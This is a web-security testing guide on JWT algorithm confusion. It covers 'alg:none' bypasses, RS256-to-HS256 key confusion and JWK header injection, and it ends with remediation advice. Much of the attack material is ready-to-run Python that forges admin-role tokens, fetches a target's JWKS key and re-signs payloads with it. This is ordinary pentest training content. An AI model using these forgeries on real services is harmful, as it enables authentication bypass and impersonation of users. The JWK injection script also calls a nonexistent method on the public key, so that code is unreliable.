# JWT Algorithm None / RS→HS Confusion

## Overview
JSON Web Tokens (JWTs) consist of a header, payload, and signature. Two critical vulnerabilities arise from algorithm confusion: the "alg:none" attack, where setting the algorithm to `none` causes some libraries to skip signature verification entirely; and the RS256→HS256 confusion attack, where the server expects RSA-signed tokens but an attacker signs a token with HMAC using the server's public key as the secret. Both attacks allow an attacker to forge arbitrary JWT payloads, leading to authentication bypass and privilege escalation.

## How It Works
- **Algorithm None**: JWT header is `{"alg":"none","typ":"JWT"}`. Some vulnerable libraries accept this and skip signature verification, accepting any payload without validation. Variant encodings: `None`, `NONE`, `nOnE`.
- **RS256→HS256 Confusion**: When the server uses RS256 (asymmetric: signs with private key, verifies with public key), an attacker obtains the server's public key (often available at `/jwks.json`, OIDC discovery, or in source). The attacker creates a token with `{"alg":"HS256"}` and signs it with the public key as the HMAC secret. The vulnerable library switches to HS256 verification and uses the public key as the HMAC secret — which matches the attacker's signature.
- **Key confusion** works because some libraries use a single verification function that adapts to the `alg` value in the header, which is attacker-controlled.

## Impact
- Complete authentication bypass — forge any user identity.
- Privilege escalation — forge admin role claims.
- Session impersonation — forge session tokens for any user.
- Affects all users if the application trusts forged tokens.

## Where to Look
- Any `Authorization: Bearer <JWT>` header.
- Cookie values containing JWTs (often named `token`, `jwt`, `access_token`, `id_token`).
- The JWT header's `alg` field (decode from base64 without signature verification).
- JWKS endpoint: `/.well-known/jwks.json`, `/oauth/jwks`, `/api/.well-known/openid-configuration`.
- JavaScript source or mobile APK for hardcoded public keys or JWT library usage.
- API responses that include a fresh JWT in the body.

## Testing Steps
1. Capture a JWT token from the application (from `Authorization` header or cookie).
2. Base64-decode the header to read the current `alg` value.
3. Test algorithm none: craft a new token with `{"alg":"none","typ":"JWT"}` header, a modified payload (e.g., `"role":"admin"`), and an empty/no signature.
4. Try all case variations of `none`: `none`, `None`, `NONE`, `nOnE`.
5. For RS256→HS256 confusion: obtain the server's public key from the JWKS endpoint or source.
6. Re-sign the modified JWT payload using HS256 with the PEM-encoded public key as the HMAC secret.
7. Submit the forged token and observe if it's accepted.
8. Try embedding the public key directly in the JWT header (`jwk` claim injection) to force key confusion.

## Payloads / Techniques

Decode a JWT to inspect header:
```bash
TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJ1c2VyIn0.SIGNATURE"
echo $TOKEN | cut -d'.' -f1 | base64 -d 2>/dev/null | python3 -m json.tool
echo $TOKEN | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool
```

Algorithm None attack:
```python
import base64
import json

def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header = {"alg": "none", "typ": "JWT"}
payload = {"user": "admin", "role": "administrator", "sub": "1"}

h = b64url_encode(json.dumps(header))
p = b64url_encode(json.dumps(payload))

# Try all variants
for alg in ["none", "None", "NONE", "nOnE"]:
    header["alg"] = alg
    h = b64url_encode(json.dumps(header))
    token = f"{h}.{p}."
    print(f"alg={alg}: {token}")
```

RS256 to HS256 confusion attack:
```python
import jwt
import requests

# Step 1: Obtain the server's public key
# From JWKS endpoint
resp = requests.get("https://target.com/.well-known/jwks.json")
# Or from source / known location
public_key_pem = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----"""

# Step 2: Forge token signed with public key as HS256 secret
payload = {"sub": "1", "user": "admin", "role": "administrator", "iat": 9999999999}

forged_token = jwt.encode(
    payload,
    public_key_pem,
    algorithm="HS256"
)
print("Forged HS256 token:", forged_token)
```

JWK injection attack (embed attacker's own public key):
```python
import jwt
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

# Generate attacker key pair
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

# Extract JWK numbers
pub_numbers = public_key.public_key().public_numbers()
import base64
def int_to_b64(n):
    return base64.urlsafe_b64encode(n.to_bytes((n.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode()

header = {
    "alg": "RS256",
    "typ": "JWT",
    "jwk": {
        "kty": "RSA",
        "n": int_to_b64(pub_numbers.n),
        "e": int_to_b64(pub_numbers.e),
        "use": "sig"
    }
}
payload = {"user": "admin", "role": "administrator"}
forged = jwt.encode(payload, private_key, algorithm="RS256", headers=header)
print("JWK injection token:", forged)
```

## Burp Suite Tips
- Install the **JSON Web Tokens** (JWT Editor) extension from BApp Store — it allows in-place editing and re-signing of JWTs in Repeater, including algorithm none and key confusion attacks.
- The **JWT Editor** "Attacks" tab has one-click buttons for "Alg None", "Embedded JWK", and "JWKS Injection" attacks.
- In **Proxy**, JWT tokens appear in Authorization headers and cookies — the extension highlights them for easy clicking.
- Use **Repeater** to submit forged tokens and observe if the response changes from 401 to 200, or if the user identity in the response body changes.
- The **Burp Active Scanner** (Pro) can detect JWT algorithm confusion issues automatically.
- Try the attack against both the web application and any API endpoints — the API may use a different JWT validation library with different vulnerability.

## Tools
- **JWT Editor** (Burp Extension) — Comprehensive JWT attack toolkit integrated into Burp.
- **jwt_tool** — Command-line JWT testing toolkit with algorithm none, HS256 confusion, and brute force modes.
- **jwt.io** — Online JWT decoder for manual analysis.
- **python-jwt / PyJWT** — Python libraries for crafting custom JWT tokens.
- **Hashcat** — Offline HMAC-SHA256 secret brute force for JWT weak secrets.

## Remediation
- Explicitly specify the expected algorithm on the server side — never allow the algorithm to be taken from the token header.
- Reject any token with `alg: none` unconditionally.
- When using RS256/ES256, do not accept HS256 tokens — enforce the expected asymmetric algorithm at the library configuration level.
- Keep JWT libraries updated; algorithm confusion was patched in most major libraries after the 2015 disclosure (CVE-2015-9235).
- If using multiple algorithms, verify that the key type matches the expected algorithm — RSA keys should only be used with RS256, HMAC secrets with HS256.
- Validate all JWT claims: `exp` (expiry), `iss` (issuer), `aud` (audience), `nbf` (not before).
- Never expose the private key; limit public key distribution to known, trusted sources.

## References
https://portswigger.net/web-security/jwt/algorithm-confusion
https://portswigger.net/web-security/jwt
https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9235
https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens
